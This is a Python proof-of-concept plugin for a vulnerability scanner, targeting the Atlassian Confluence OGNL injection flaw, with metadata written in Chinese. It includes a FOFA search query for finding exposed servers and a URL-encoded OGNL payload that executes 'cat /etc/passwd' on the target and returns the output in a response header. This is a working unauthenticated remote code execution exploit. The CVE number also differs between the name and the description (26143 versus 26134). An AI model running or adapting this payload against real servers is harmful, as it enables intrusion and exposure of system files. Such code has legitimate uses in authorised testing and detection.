# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua
from lib.core.poc import POCBase
# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2022-06-06",        # POC创建时间
        "UpdateDate" : "2022-06-06",        # POC创建时间
        "PocDesc" : """
            略  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "Atlassian Confluence OGNL表达式注入漏洞（CVE-2022-26143）",                        # 漏洞名称
        "VulnID" : "CVE-2022-26143",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "Atlassian Confluence",                     # 漏洞应用名称
        "AppVersion" : """
            ConfluenceServerandDataCenter>=1.3.0
            ConfluenceServerandDataCenter<7.4.17
            ConfluenceServerandDataCenter<7.13.7
            ConfluenceServerandDataCenter<7.14.3
            ConfluenceServerandDataCenter<7.15.2
            ConfluenceServerandDataCenter<7.16.4
            ConfluenceServerandDataCenter<7.17.4
            ConfluenceServerandDataCenter<7.18.1
        """,                  # 漏洞应用版本
        "VulnDate" : "2022-06-06",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            近日，Atlassian官方发布了Confluence Server和Data Center OGNL 注入漏洞（CVE-2022-26134）的安全公告，
            远程攻击者在未经身份验证的情况下，可构造OGNL表达式进行注入，实现在Confluence Server或Data Center上执行任意代码，CVSS评分为10。
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            app="ATLASSIAN-Confluence"
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    # timeout = 10


    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url = self.target + "/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22cat%20/etc/passwd%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/" # url自己按需调整
        

        headers = {"User-Agent":get_random_ua(),
                    "Connection":"close",
                    "Content-Type": "application/x-www-form-urlencoded",
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req = requests.get(url,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False,allow_redirects=False)

            if req.status_code == 302 and "root:/root" in req.headers["X-Cmd-Response"]:
                vuln = [True,req.headers["X-Cmd-Response"]]
            else:
                vuln = [False,req.headers["X-Cmd-Response"]]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()
